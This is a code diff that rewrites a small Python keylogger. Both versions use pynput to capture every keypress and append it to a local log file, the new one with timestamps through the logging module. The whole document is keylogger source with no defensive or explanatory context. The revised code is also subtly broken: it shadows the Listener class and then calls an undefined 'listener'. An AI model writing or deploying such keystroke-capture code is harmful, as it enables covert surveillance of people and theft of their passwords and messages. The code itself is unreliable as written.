@@ -1,15 +1,13 @@
-from pynput import keyboard
+from pynput.keyboard import Key, Listener
+import logging
 
-def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
-        try:
-            char = key.char
-            logKey.write(char)
-        except:
-            print("Error getting char")
+log_dir = ""
 
-if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
+    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as Listener:
+    listener.join()
